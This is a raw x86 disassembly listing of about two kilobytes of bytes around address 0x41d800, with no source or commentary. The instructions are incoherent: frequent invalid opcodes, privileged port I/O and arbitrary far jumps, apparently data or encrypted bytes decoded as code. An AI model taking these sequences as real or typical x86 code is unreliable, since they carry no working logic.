  41d7fe:	dec    edx
  41d7ff:	adc    eax,DWORD PTR [ebx-0x39cf7f43]
  41d805:	dec    ecx
  41d806:	inc    edi
  41d807:	ja     0x41d862
  41d809:	shr    DWORD PTR [ebp-0x15feaf7],1
  41d80f:	sahf   
  41d810:	fdivr  DWORD PTR [ecx]
  41d812:	cmp    cl,al
  41d814:	xor    eax,0x964dc0df
  41d819:	je     0x41d813
  41d81b:	shl    DWORD PTR [ebx+0x63],1
  41d81e:	idiv   al
  41d820:	push   ecx
  41d821:	loope  0x41d7dd
  41d823:	pusha  
  41d824:	xchg   esi,eax
  41d825:	push   DWORD PTR [ebp+0x7bb6c845]
  41d82b:	cwde   
  41d82c:	xchg   BYTE PTR [eax+eax*1-0x761b5a6e],ch
  41d833:	mov    edx,0x47ffa03d
  41d838:	js     0x41d8a9
  41d83a:	jo     0x41d891
  41d83c:	cdq    
  41d83d:	mul    DWORD PTR [eax]
  41d83f:	arpl   WORD PTR [ebx],bp
  41d841:	fs dec esp
  41d843:	cmp    BYTE PTR [eax+0x20],dh
  41d846:	cmp    eax,esi
  41d848:	inc    edx
  41d849:	int    0xda
  41d84b:	popa   
  41d84c:	xchg   edi,eax
  41d84d:	inc    edx
  41d84e:	dec    edi
  41d84f:	xchg   esp,eax
  41d850:	xor    al,0x26
  41d852:	cwde   
  41d853:	dec    ebp
  41d854:	sub    al,0xa6
  41d856:	mov    ds:0x9cec4403,al
  41d85b:	pusha  
  41d85c:	xor    esi,DWORD PTR [eax]
  41d85e:	mov    ecx,0xab668f3b
  41d863:	and    edx,DWORD PTR [ebx+0x2e]
  41d866:	mov    esp,0x7c93d603
  41d86b:	(bad)  [edx+0x54]
  41d86e:	leave  
  41d86f:	lods   al,BYTE PTR ds:[esi]
  41d870:	addr16 in al,0x40
  41d873:	loop   0x41d8c0
  41d875:	mov    al,ds:0xb754a547
  41d87a:	fs pop edx
  41d87c:	add    eax,0xe655f5bd
  41d881:	jns    0x41d84d
  41d883:	out    0x29,eax
  41d885:	or     eax,0xef2af26f
  41d88a:	(bad)  
  41d88b:	das    
  41d88c:	outs   dx,BYTE PTR ds:[esi]
  41d88d:	rol    BYTE PTR [eax+0x29],0xaa
  41d891:	fistp  WORD PTR [eax+0x4d]
  41d894:	retf   0xe7c0
  41d897:	data16 xor dh,BYTE PTR [esi-0x32fbc18c]
  41d89e:	call   0xc82d:0x60a9d5da
  41d8a5:	test   eax,0xee4351
  41d8aa:	dec    ebx
  41d8ab:	mov    ah,dh
  41d8ad:	gs mov bl,0x4
  41d8b0:	mov    edi,DWORD PTR [edi+0x1946126d]
  41d8b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8b7:	or     al,0x17
  41d8b9:	test   DWORD PTR [edx-0x2d],esp
  41d8bc:	test   al,0xe8
  41d8be:	mov    bl,0x58
  41d8c0:	mov    bh,0xe1
  41d8c2:	mov    DWORD PTR [ebp-0x337ed722],esi
  41d8c8:	jle    0x41d908
  41d8ca:	mov    ds:0x92d916bc,al
  41d8cf:	or     al,0xf8
  41d8d1:	push   eax
  41d8d2:	bound  ecx,QWORD PTR [esi]
  41d8d4:	rcr    BYTE PTR [ebx+0x5d],1
  41d8d7:	call   0x8300:0xf0cd78a3
  41d8de:	cli    
  41d8df:	sahf   
  41d8e0:	pop    edi
  41d8e1:	mov    dl,0x50
  41d8e3:	lea    edx,[edi+ebx*2-0x55d1347]
  41d8ea:	test   eax,0x7f6ef6ee
  41d8ef:	adc    ah,BYTE PTR [ebx+0x699c8dc9]
  41d8f5:	mov    eax,ds:0xf826789e
  41d8fa:	out    0x31,eax
  41d8fc:	leave  
  41d8fd:	dec    ebp
  41d8fe:	mov    ds:0xd21b0a91,eax
  41d903:	std    
  41d904:	imul   esp,DWORD PTR [eax-0x7c],0xffffffe9
  41d908:	mov    edx,ss
  41d90a:	mov    eax,ds:0xd7d9affd
  41d90f:	out    0xc8,al
  41d911:	mov    eax,ds:0x67f4d06f
  41d916:	dec    esi
  41d917:	jne    0x41d8de
  41d919:	bound  eax,QWORD PTR [esi]
  41d91b:	cmp    al,0x64
  41d91d:	arpl   WORD PTR [ebx],bx
  41d91f:	jl     0x41d976
  41d921:	mul    DWORD PTR [esi+0x5fd5be98]
  41d927:	pop    ebx
  41d928:	lea    ebp,ds:0x6388ab3d
  41d92e:	inc    eax
  41d92f:	or     BYTE PTR [edi+0x37],dh
  41d932:	mov    al,ds:0x2fd53345
  41d937:	rcl    BYTE PTR [ebx+0x50],cl
  41d93a:	and    al,0x2b
  41d93c:	push   ss
  41d93d:	repz gs inc ebx
  41d940:	addr16 (bad) 
  41d943:	pop    esi
  41d944:	adc    BYTE PTR [edx],bl
  41d946:	lock ds xchg esi,eax
  41d949:	aad    0x13
  41d94b:	test   DWORD PTR [ebp+0x5e1afc8e],eax
  41d951:	push   0xfffffff3
  41d953:	fild   DWORD PTR [eax]
  41d955:	add    BYTE PTR [ebx-0x61],cl
  41d958:	mov    esp,0xe8115661
  41d95d:	pop    ss
  41d95e:	int    0x92
  41d960:	test   BYTE PTR [ebx+0x55],cl
  41d963:	or     DWORD PTR [esi],0xcafe466c
  41d969:	push   esi
  41d96a:	daa    
  41d96b:	repz jb 0x41d9b7
  41d96e:	fsub   QWORD PTR [esi-0x5cf7610]
  41d974:	jo     0x41d9d6
  41d976:	in     al,0x0
  41d978:	and    eax,0x147f8e63
  41d97d:	rcl    BYTE PTR [edx+0x3177296],1
  41d983:	xchg   DWORD PTR [ecx+0x51],edx
  41d986:	(bad)  
  41d988:	aam    0x80
  41d98a:	sbb    DWORD PTR [eax-0x33],ecx
  41d98d:	(bad)
  41d990:	or     DWORD PTR [edx-0x542991e2],ebp
  41d996:	mov    edx,0x23ee31dd
  41d99b:	cmp    bl,BYTE PTR [eax]
  41d99d:	(bad)
  41d9a0:	mov    ds:0x10169ced,al
  41d9a5:	stos   BYTE PTR es:[edi],al
  41d9a6:	popa   
  41d9a7:	or     BYTE PTR [ebx-0x2ff5f603],al
  41d9ad:	inc    edi
  41d9ae:	jns    0x41d95a
  41d9b0:	bound  edi,QWORD PTR [edx+0x560bf4b3]
  41d9b6:	repnz push ecx
  41d9b8:	dec    eax
  41d9b9:	popa   
  41d9ba:	mov    dh,0xce
  41d9bc:	loop   0x41d9a3
  41d9be:	ins    DWORD PTR es:[edi],dx
  41d9bf:	inc    DWORD PTR [ecx]
  41d9c1:	cwde   
  41d9c2:	pop    esi
  41d9c3:	out    0x14,eax
  41d9c5:	pop    esp
  41d9c6:	mov    dl,0x90
  41d9c8:	mov    esp,0x85b95092
  41d9cd:	fwait
  41d9ce:	jne    0x41d961
  41d9d0:	inc    ecx
  41d9d1:	and    BYTE PTR [esi],bl
  41d9d3:	mov    edi,0x9e19de6
  41d9d8:	out    dx,al
  41d9d9:	adc    eax,0xc994a581
  41d9de:	pusha  
  41d9df:	jmp    0x41d9fc
  41d9e1:	shl    DWORD PTR [ecx+0x32],cl
  41d9e4:	jle    0x41da18
  41d9e6:	dec    ecx
  41d9e7:	enter  0x33c5,0x6a
  41d9eb:	lods   eax,DWORD PTR ds:[esi]
  41d9ec:	iret   
  41d9ed:	jns    0x41d9ad
  41d9ef:	xchg   ah,al
  41d9f1:	add    dh,BYTE PTR [ecx-0x45]
  41d9f4:	inc    ebp
  41d9f5:	aaa    
  41d9f6:	clc    
  41d9f7:	pop    ds
  41d9f8:	fsubr  DWORD PTR [ebx-0x71aef473]
  41d9fe:	mov    fs,edi
  41da00:	xor    al,0x42
  41da02:	adc    DWORD PTR [esi+0x20089106],ebp
  41da08:	add    ah,BYTE PTR [esi+0x2023d9e9]
  41da0e:	mov    esp,0x199690c8
  41da13:	mov    ebx,0x3e83b03
  41da18:	and    BYTE PTR [eax-0x4a],ch
  41da1b:	cmp    eax,0x45bbe22c
  41da20:	sbb    bh,bl
  41da22:	pop    ebp
  41da23:	jo     0x41d9be
  41da25:	push   esi
  41da26:	stc    
  41da27:	sub    al,0x3e
  41da29:	xchg   ebp,eax
  41da2a:	stos   BYTE PTR es:[edi],al
  41da2b:	stos   DWORD PTR es:[edi],eax
  41da2c:	dec    ecx
  41da2d:	or     eax,0xbb4d7efc
  41da32:	jecxz  0x41da42
  41da34:	push   ebx
  41da35:	cmp    bl,BYTE PTR [edi]
  41da37:	xchg   edi,eax
  41da38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da39:	adc    esi,ebp
  41da3b:	sbb    al,0x9e
  41da3d:	mov    esp,0xc238e448
  41da42:	sbb    bl,dl
  41da44:	(bad)  
  41da46:	dec    ebx
  41da47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da48:	xchg   ebx,eax
  41da49:	pop    eax
  41da4a:	aam    0x4e
  41da4c:	pop    ebx
  41da4d:	scas   al,BYTE PTR es:[edi]
  41da4e:	in     al,dx
  41da4f:	push   ss
  41da50:	xor    DWORD PTR [esi],ebp
  41da52:	stc    
  41da53:	xor    cl,BYTE PTR [ecx+0x60991e2f]
  41da59:	inc    esp
  41da5a:	xor    al,0x3a
  41da5c:	inc    DWORD PTR [edi+0x54]
  41da5f:	addr16 out dx,al
  41da61:	jmp    0xd51f:0xc5617150
  41da68:	cmp    al,0x2e
  41da6a:	dec    ebp
  41da6b:	mov    bl,BYTE PTR [edi+0x51]
  41da6e:	lock mov ah,0x81
  41da71:	or     DWORD PTR [eax],ebx
  41da73:	iret   
  41da74:	push   ecx
  41da75:	jns    0x41daaf
  41da77:	shr    esp,cl
  41da79:	cmp    ebp,ebx
  41da7b:	addr16 jmp 0x4164f7e2
  41da81:	sub    DWORD PTR [ecx],eax
  41da83:	jnp    0x41da75
  41da85:	pop    edi
  41da86:	inc    ebx
  41da87:	mov    ebp,0x8becbeb2
  41da8c:	loop   0x41da5c
  41da8e:	mov    esp,0x8463d48e
  41da93:	loope  0x41da3d
  41da95:	inc    esi
  41da96:	and    eax,0x2abce6d1
  41da9b:	mov    WORD PTR [ebp-0x3e5da33f],?
  41daa1:	sub    dl,dh
  41daa3:	xchg   esi,eax
  41daa4:	xor    BYTE PTR [eax+0x45f66f6c],al
  41daaa:	test   BYTE PTR [esi+0x65],dh
  41daad:	out    0x48,al
  41daaf:	rcl    WORD PTR [edx],0x75
  41dab3:	adc    esi,ebx
  41dab5:	or     BYTE PTR [edx+0x700f7bfa],ch
  41dabb:	cmp    eax,0x78151473
  41dac0:	cmp    ecx,edi
  41dac2:	mov    edx,DWORD PTR cs:[ebx]
  41dac5:	add    bh,BYTE PTR [edx]
  41dac7:	loop   0x41dab5
  41dac9:	ins    DWORD PTR es:[edi],dx
  41daca:	mov    WORD PTR [eax-0x22],ds
  41dacd:	adc    eax,0x7fcc5ff1
  41dad2:	dec    ebp
  41dad3:	mov    edi,0x7ddd10b
  41dad8:	lahf   
  41dad9:	inc    eax
  41dada:	mov    al,0xdb
  41dadc:	pop    es
  41dadd:	sub    BYTE PTR [eax+0x11452c60],ch
  41dae3:	push   ds
  41dae4:	xchg   ebp,eax
  41dae5:	gs jmp 0x41db26
  41dae8:	jecxz  0x41daf7
  41daea:	pushf  
  41daeb:	clc    
  41daec:	iret   
  41daed:	icebp  
  41daee:	and    BYTE PTR [edx+0x1396da7c],cl
  41daf4:	xchg   BYTE PTR [ebx],bl
  41daf6:	stc    
  41daf7:	mov    ah,0xab
  41daf9:	fistp  WORD PTR [ebp+0x72]
  41dafc:	jns    0x41daaa
  41dafe:	scas   eax,DWORD PTR es:[edi]
  41daff:	xor    DWORD PTR [ecx],esi
  41db01:	push   cs
  41db02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db03:	push   eax
  41db04:	js     0x41dad6
  41db06:	fisub  WORD PTR [ecx]
  41db08:	gs leave 
  41db0a:	or     eax,ecx
  41db0c:	jmp    0x7fbbe3b2
  41db11:	in     eax,0x1f
  41db13:	les    esi,FWORD PTR [ebx]
  41db15:	push   ds
  41db16:	mov    bh,0x27
  41db18:	jae    0x41db0d
  41db1a:	jge    0x41db89
  41db1c:	sub    DWORD PTR [eax+0x6043e7f7],edi
  41db22:	mov    esi,0xac779e02
  41db27:	sbb    DWORD PTR [eax-0x2085228],edi
  41db2d:	mov    ds:0xb7e39b7b,al
  41db32:	mov    ebx,0xc6c40de0
  41db37:	aad    0xb9
  41db39:	test   DWORD PTR [edx],ebx
  41db3b:	popf   
  41db3c:	retf   0xf6a6
  41db3f:	mov    DWORD PTR [ecx+0x70bd50da],edx
  41db45:	icebp  
  41db46:	add    BYTE PTR [edi+esi*8+0x513682e6],ah
  41db4d:	dec    esp
  41db4e:	mov    bl,0x61
  41db50:	das    
  41db51:	jne    0x41db3b
  41db53:	cdq    
  41db54:	(bad)  
  41db55:	xor    edx,DWORD PTR [eax]
  41db57:	popa   
  41db58:	dec    esp
  41db59:	pop    ss
  41db5a:	popf   
  41db5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db5c:	pop    ss
  41db5d:	push   edx
  41db5e:	ins    DWORD PTR es:[edi],dx
  41db5f:	mov    ?,edi
  41db61:	gs sbb al,0xa9
  41db64:	push   0xffffff9b
  41db66:	pop    ebp
  41db67:	pop    eax
  41db68:	or     eax,0x1f012e75
  41db6d:	test   BYTE PTR [eax+0x8],dl
  41db70:	fild   QWORD PTR [edx]
  41db72:	cmc    
  41db73:	fcom   st(4)
  41db75:	in     al,0x5d
  41db77:	or     BYTE PTR [edx+0x54],cl
  41db7a:	xchg   edi,eax
  41db7b:	je     0x41db30
  41db7d:	test   eax,0xbef5ff36
  41db82:	icebp  
  41db83:	mov    DWORD PTR [ebx+0x21c5b856],esi
  41db89:	iret   
  41db8a:	add    eax,0xe89d0586
  41db8f:	or     DWORD PTR ds:0xfbe06333,eax
  41db95:	cdq    
  41db96:	mov    edx,eax
  41db98:	mov    bh,0x9c
  41db9a:	jmp    0x814be0d0
  41db9f:	push   0xa5cc715b
  41dba4:	es adc eax,0x71a06948
  41dbaa:	mov    al,ds:0x72b93f24
  41dbaf:	and    DWORD PTR [ebx+0x3f],edx
  41dbb2:	push   ecx
  41dbb3:	in     al,dx
  41dbb4:	loope  0x41db49
  41dbb6:	sub    eax,0x872f21d0
  41dbbb:	or     cl,BYTE PTR [ebp-0x6befe9bf]
  41dbc1:	or     ah,bh
  41dbc3:	mov    DWORD PTR [ecx],ebx
  41dbc5:	out    0x22,al
  41dbc7:	ins    BYTE PTR es:[edi],dx
  41dbc8:	test   eax,0x7e6af256
  41dbcd:	dec    esi
  41dbce:	stos   DWORD PTR es:[edi],eax
  41dbcf:	ins    BYTE PTR es:[edi],dx
  41dbd0:	icebp  
  41dbd1:	mov    edi,0xb54925f8
  41dbd6:	pusha  
  41dbd7:	mov    esp,eax
  41dbd9:	jle    0x41dc3c
  41dbdb:	push   ecx
  41dbdc:	dec    ebx
  41dbdd:	add    DWORD PTR [ebp+0x78aac0c8],esp
  41dbe3:	pop    edi
  41dbe4:	int3   
  41dbe5:	pop    ss
  41dbe6:	push   ss
  41dbe7:	gs in  al,0x9b
  41dbea:	fs pusha 
  41dbec:	ror    BYTE PTR [edx-0x22],1
  41dbef:	inc    DWORD PTR [ecx+edx*2+0x40c0023]
  41dbf6:	(bad)  
  41dbf7:	cs xchg ecx,eax
  41dbf9:	fs mov cl,0x30
  41dbfc:	in     eax,0x7f
  41dbfe:	fstp   QWORD PTR [ecx]
  41dc00:	out    dx,eax
  41dc01:	nop
  41dc02:	push   edi
  41dc03:	or     ebp,ecx
  41dc05:	dec    eax
  41dc06:	sbb    al,0x8a
  41dc08:	imul   eax,DWORD PTR [eax],0xe9f72f02
  41dc0e:	popf   
  41dc0f:	inc    ebp
  41dc10:	lods   al,BYTE PTR ds:[esi]
  41dc11:	imul   ebx,esi,0x20
  41dc14:	cmp    esi,DWORD PTR [eax-0x223bdcbc]
  41dc1a:	or     eax,0xce249425
  41dc1f:	dec    eax
  41dc20:	out    dx,eax
  41dc21:	out    dx,eax
  41dc22:	shl    BYTE PTR [esi+0x2a],cl
  41dc25:	scas   al,BYTE PTR es:[edi]
  41dc26:	clc    
  41dc27:	and    DWORD PTR [ebx],ecx
  41dc29:	cmp    BYTE PTR [ecx],dh
  41dc2b:	fdiv   DWORD PTR [esi+0x39d8baa0]
  41dc31:	inc    ebx
  41dc32:	daa    
  41dc33:	mov    al,0xf7
  41dc35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc36:	cmp    al,bl
  41dc38:	dec    ebx
  41dc39:	aad    0x36
  41dc3b:	xchg   ebx,eax
  41dc3c:	out    0x97,eax
  41dc3e:	jg     0x41dc5b
  41dc40:	mov    ebp,0x90e5b554
  41dc45:	mov    edi,0x2af99479
  41dc4a:	xor    eax,0x45e95aac
  41dc4f:	daa    
  41dc50:	stos   BYTE PTR es:[edi],al
  41dc51:	or     DWORD PTR [edi+0x5b],edx
  41dc54:	cld    
  41dc55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc56:	outs   dx,BYTE PTR ds:[esi]
  41dc57:	jle    0x41dbe1
  41dc59:	ins    BYTE PTR es:[edi],dx
  41dc5a:	mov    bh,0x51
  41dc5c:	lods   eax,DWORD PTR ds:[esi]
  41dc5d:	xor    edx,0x66
  41dc60:	mov    edi,0x47bae51e
  41dc65:	jne    0x41dcaf
  41dc67:	std    
  41dc68:	imul   ebp,DWORD PTR [edx],0x3d
  41dc6b:	push   ecx
  41dc6c:	adc    cl,BYTE PTR [ebx-0x75cd9fb2]
  41dc72:	jae    0x41dc9b
  41dc74:	popf   
  41dc75:	test   al,0x6a
  41dc77:	into   
  41dc78:	push   ebx
  41dc79:	add    al,0xad
  41dc7b:	push   es
  41dc7c:	fstp   DWORD PTR [ecx+0x1ac45893]
  41dc82:	mov    eax,0xdca7f64a
  41dc87:	adc    dh,bl
  41dc89:	cmp    al,0xd9
  41dc8b:	ins    BYTE PTR es:[edi],dx
  41dc8c:	inc    eax
  41dc8d:	xor    eax,0x320a1168
  41dc92:	add    al,0x2b
  41dc94:	fsub   QWORD PTR ss:[ebx-0x69]
  41dc98:	pop    ebp
  41dc99:	pushf  
  41dc9a:	inc    ebp
  41dc9b:	sub    bl,ah
  41dc9d:	outs   dx,BYTE PTR ds:[esi]
  41dc9e:	int    0x1f
  41dca0:	xor    edi,DWORD PTR [edi-0x298787df]
  41dca6:	(bad)  [ebp+ecx*1-0x6b]
  41dcaa:	leave  
  41dcab:	jbe    0x41dc70
  41dcad:	dec    edx
  41dcae:	add    ecx,eax
  41dcb0:	rcr    DWORD PTR [edi-0x53],cl
  41dcb3:	pop    esp
  41dcb4:	dec    ebp
  41dcb5:	sbb    BYTE PTR ds:0xf874f475,ah
  41dcbb:	repnz stos DWORD PTR es:[edi],eax
  41dcbd:	test   DWORD PTR [edi+0x777779f4],esp
  41dcc3:	pop    es
  41dcc4:	ret    0x9c8a
  41dcc7:	imul   eax,ebp,0x917f897d
  41dccd:	sahf   
  41dcce:	sahf   
  41dccf:	push   edx
  41dcd0:	dec    ebp
  41dcd1:	fcom   QWORD PTR [esi]
  41dcd3:	mov    ebp,edi
  41dcd5:	pop    edx
  41dcd6:	int    0xab
  41dcd8:	mov    ebp,0xe987c44a
  41dcdd:	jg     0x41dc65
  41dcdf:	fild   DWORD PTR [ecx+0x55282f7d]
  41dce5:	gs xor al,0xe4
  41dce8:	push   ebx
  41dce9:	enter  0x8529,0x8e
  41dced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcee:	rcr    BYTE PTR [esi+0x7b],cl
  41dcf1:	push   edx
  41dcf2:	rcl    BYTE PTR [edi+ebx*1-0x2c94c810],cl
  41dcf9:	xor    al,0xc3
  41dcfb:	push   esi
  41dcfc:	pop    edi
  41dcfd:	std    
  41dcfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcff:	dec    esi
  41dd00:	inc    edi
  41dd01:	mov    DWORD PTR gs:[edx],edi
  41dd04:	shl    al,1
  41dd06:	test   DWORD PTR [esi-0x14],ecx
  41dd09:	setns  BYTE PTR [ecx+0x273f54ca]
  41dd10:	sbb    dl,ch
  41dd12:	sub    ebx,DWORD PTR [edi]
  41dd14:	sbb    DWORD PTR [eax+0x31],edi
  41dd17:	lds    edi,FWORD PTR [eax]
  41dd19:	jo     0x41dca4
  41dd1b:	or     esp,DWORD PTR [edx]
  41dd1d:	into   
  41dd1e:	xor    eax,DWORD PTR [ebx+0x10d9d8e6]
  41dd24:	sti    
  41dd25:	add    dh,BYTE PTR [esi-0x38]
  41dd28:	push   edx
  41dd29:	pop    edx
  41dd2a:	sar    al,cl
  41dd2c:	mov    edi,0xce1428fe
  41dd31:	pop    ebx
  41dd32:	push   es
  41dd33:	xchg   edi,eax
  41dd34:	aad    0x6d
  41dd36:	xchg   esi,eax
  41dd37:	mov    ds:0x257516,al
  41dd3c:	mulps  xmm3,xmm1
  41dd3f:	outs   dx,DWORD PTR ds:[esi]
  41dd40:	gs loopne 0x41dd27
  41dd43:	ror    BYTE PTR [eax-0x1765d1a9],cl
  41dd49:	xchg   ebx,eax
  41dd4a:	cli    
  41dd4b:	popf   
  41dd4c:	xchg   ebx,eax
  41dd4d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41dd4f:	and    dl,0xca
  41dd52:	or     eax,0x64bc56c2
  41dd57:	icebp  
  41dd58:	add    ch,BYTE PTR [ecx]
  41dd5a:	jge    0x41dd0b
  41dd5c:	and    eax,0x64b78155
  41dd61:	fidiv  DWORD PTR [eax]
  41dd63:	cmp    eax,0x5714f749
  41dd68:	mov    edi,0xed2ac162
  41dd6d:	jl     0x41dd39
  41dd6f:	jp     0x41ddc8
  41dd71:	into   
  41dd72:	repz mov ebp,0xaf1dbcf7
  41dd78:	mov    ds:0x4543473b,al
  41dd7d:	sar    DWORD PTR [edi],0x43
  41dd80:	adc    al,0x2b
  41dd82:	lods   al,BYTE PTR ds:[esi]
  41dd83:	sbb    DWORD PTR [esi],ebx
  41dd85:	xchg   ah,cl
  41dd87:	adc    ebp,ebx
  41dd89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd8a:	add    DWORD PTR [ebp+0x39],esp
  41dd8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd8e:	cmp    dl,BYTE PTR [edi-0x3c]
  41dd91:	cmp    BYTE PTR [esi],al
  41dd93:	ficomp DWORD PTR [esi]
  41dd95:	ins    BYTE PTR es:[edi],dx
  41dd96:	ficom  DWORD PTR [eax]
  41dd98:	inc    eax
  41dd99:	hlt    
  41dd9a:	scas   eax,DWORD PTR es:[edi]
  41dd9b:	popf   
  41dd9c:	mov    ebx,0xb1afaddb
  41dda1:	rcr    edi,cl
  41dda3:	jns    0x41ddbe
  41dda5:	cli    
  41dda6:	sbb    eax,0xebd3c264
  41ddab:	xchg   esi,eax
  41ddac:	(bad)  
  41ddad:	js     0x41de13
  41ddaf:	sub    ebp,edi
  41ddb1:	xor    DWORD PTR [edx+0x64a03dc7],0xffffff96
  41ddb8:	push   edx
  41ddb9:	adc    eax,0xd5cdcc5b
  41ddbe:	pop    es
  41ddbf:	jecxz  0x41ddb8
  41ddc1:	mov    al,ds:0xc8f7fda
  41ddc6:	dec    eax
  41ddc7:	retf   
  41ddc8:	mul    DWORD PTR [edx+0x3024769]
  41ddce:	mov    dl,0xd5
  41ddd0:	pushf  
  41ddd1:	sub    eax,0x197271bc
  41ddd6:	jmp    0xddfb:0xb473d1b4
  41dddd:	dec    edx
  41ddde:	jmp    0xe2b9:0x720a4ea1
  41dde5:	aas    
  41dde6:	push   ecx
  41dde7:	mov    bl,0xdb
  41dde9:	int3   
  41ddea:	pop    edi
  41ddeb:	or     ebx,0x2fbf11e
  41ddf1:	(bad)  
  41ddf2:	mov    ds,ebx
  41ddf4:	icebp  
  41ddf5:	inc    ebx
  41ddf6:	retf   0x13e5
  41ddf9:	shl    BYTE PTR [ecx-0x42f84f7],cl
  41ddff:	enter  0x41be,0x83
  41de03:	icebp  
  41de04:	stos   DWORD PTR es:[edi],eax
  41de05:	out    dx,al
  41de06:	add    BYTE PTR [eax-0x9029584],cl
  41de0c:	xchg   edi,eax
  41de0d:	xchg   ebp,eax
  41de0e:	adc    al,0xdd
  41de10:	add    al,0x5a
  41de12:	inc    ecx
  41de13:	xor    cl,ch
  41de15:	mov    bh,BYTE PTR [ebx-0x676827a9]
  41de1b:	or     ecx,edx
  41de1d:	dec    edi
  41de1e:	es inc eax
  41de20:	add    al,0x6a
  41de22:	leave  
  41de23:	jae    0x41de84
  41de25:	or     DWORD PTR [ebx],edx
  41de27:	int    0xc3
  41de29:	inc    BYTE PTR [ebp-0x3fa19e47]
  41de2f:	mov    ecx,ebx
  41de31:	fcomip st,st(6)
  41de33:	dec    esi
  41de34:	out    dx,eax
  41de35:	xor    al,0xb4
  41de37:	sub    eax,0xfae0985
  41de3c:	test   BYTE PTR [esi+0x6e],al
  41de3f:	adc    DWORD PTR [eax-0xc],edi
  41de42:	or     eax,DWORD PTR [edx+ecx*2]
  41de45:	mov    al,0x29
  41de47:	jg     0x41de86
  41de49:	xor    ch,BYTE PTR [edx]
  41de4b:	xor    eax,0x36547f37
  41de50:	dec    eax
  41de51:	fst    DWORD PTR [ebp-0xe]
  41de54:	xor    cl,BYTE PTR [ebp-0x54ed59b5]
  41de5a:	rol    BYTE PTR ds:0x27837859,1
  41de60:	push   esp
  41de61:	std    
  41de62:	loopne 0x41deb0
  41de64:	xor    eax,ebp
  41de66:	scas   eax,DWORD PTR es:[edi]
  41de67:	or     eax,DWORD PTR [eax+edx*2+0x4d0fc8db]
  41de6e:	arpl   WORD PTR [eax+0x18],sp
  41de71:	inc    esp
  41de72:	fsubr  QWORD PTR [ecx+0xd497542]
  41de78:	loop   0x41deea
  41de7a:	sbb    edi,DWORD PTR [edi+0x59]
  41de7d:	not    DWORD PTR [ecx-0xec06d4e]
  41de83:	rcl    DWORD PTR [eax+ebp*8+0x6f],cl
  41de87:	sbb    eax,0x667f797d
  41de8c:	in     al,dx
  41de8d:	out    dx,eax
  41de8e:	xrelease xchg DWORD PTR ds:0x6e503315,ebp
  41de95:	stos   DWORD PTR es:[edi],eax
  41de96:	mov    edx,0xbf07ae34
  41de9b:	and    edx,DWORD PTR [edx-0x38]
  41de9e:	add    al,0xc4
  41dea0:	jnp    0x41de8e
  41dea2:	xchg   ebx,eax
  41dea3:	fidivr WORD PTR [ebp+0x70]
  41dea6:	mov    al,ds:0xa640806d
  41deab:	inc    esp
  41deac:	or     bl,dh
  41deae:	iret   
  41deaf:	mov    dh,0x9a
  41deb1:	in     eax,dx
  41deb2:	and    al,0x1e
  41deb4:	cdq    
  41deb5:	sub    DWORD PTR ds:0xffd2e231,ebx
  41debb:	sub    DWORD PTR [ebx-0x7b08afcc],edi
  41dec1:	xor    eax,0x99276952
  41dec6:	mov    edx,ds
  41dec8:	sbb    al,0xba
  41deca:	jbe    0x41dec1
  41decc:	ja     0x41de58
  41dece:	and    ebp,DWORD PTR [esi+eax*2-0x28768169]
  41ded5:	or     al,0xc8
  41ded7:	pop    esi
  41ded8:	jo     0x41deb3
  41deda:	aaa    
  41dedb:	mov    eax,ds:0xafca185f
  41dee0:	iret   
  41dee1:	lahf   
  41dee2:	pop    edx
  41dee3:	and    al,0x1a
  41dee5:	cmp    DWORD PTR [edx-0x78b41024],0x6606b5d1
  41deef:	mov    ebp,0x9f7f04f5
  41def4:	mov    edi,0xb2099b72
  41def9:	(bad)  
  41defa:	nop
  41defb:	pop    esi
  41defc:	ja     0x41df2f
  41defe:	loopne 0x41df54
  41df00:	fcomp  st(2)
  41df02:	icebp  
  41df03:	adc    esp,ebx
  41df05:	jne    0x41de90
  41df07:	mov    ch,0xdd
  41df09:	push   ecx
  41df0a:	lds    esi,FWORD PTR [edx+0x0]
  41df0d:	mov    dl,0x6a
  41df0f:	mov    edi,0x7a0a7e5e
  41df14:	pop    esp
  41df15:	fcomp  QWORD PTR ds:0x4bfbac74
  41df1b:	inc    edx
  41df1c:	inc    ecx
  41df1d:	rcr    ebp,cl
  41df1f:	push   ebx
  41df20:	mov    esp,0xb284a5f6
  41df25:	xchg   ebp,eax
  41df26:	sbb    esi,DWORD PTR [eax]
  41df28:	stos   DWORD PTR es:[edi],eax
  41df29:	ja     0x41ded7
  41df2b:	mov    ds:0x3d94cb71,eax
  41df30:	pop    es
  41df31:	fisub  DWORD PTR [ebp+0x3a]
  41df34:	mov    esp,0x4a5bb1c
  41df39:	outs   dx,DWORD PTR ds:[esi]
  41df3a:	out    0x3c,al
  41df3c:	mov    BYTE PTR [ecx-0x1d4fd301],dh
  41df42:	fcomp  st(2)
  41df44:	mov    ax,es
  41df47:	icebp  
  41df48:	and    BYTE PTR [edi],ah
  41df4a:	movzx  ebx,BYTE PTR [edx+eax*1-0x12]
  41df4f:	adc    dl,BYTE PTR [ebp+0x17336bb2]
  41df55:	ins    DWORD PTR es:[edi],dx
  41df56:	lahf   
  41df57:	ja     0x41df00
  41df59:	xor    al,0xc
  41df5b:	icebp  
  41df5c:	call   DWORD PTR [edi]
  41df5e:	shl    DWORD PTR ds:0xb7c68a91,0x9f
  41df65:	jo     0x41df72
  41df67:	push   ebp
  41df68:	and    eax,0x5e36fec8
  41df6d:	and    DWORD PTR [ebp-0xc],ecx
  41df70:	fcomp  DWORD PTR [ebx]
  41df72:	and    BYTE PTR [esi+0x52dd6b0c],bl
  41df78:	or     eax,0x77
  41df7b:	sbb    bl,BYTE PTR [esi+0x7b]
  41df7e:	add    cl,BYTE PTR [edx-0x1c35c1ca]
  41df84:	fdivp  st(2),st
  41df86:	push   esi
  41df87:	out    0xf0,al
  41df89:	ret    
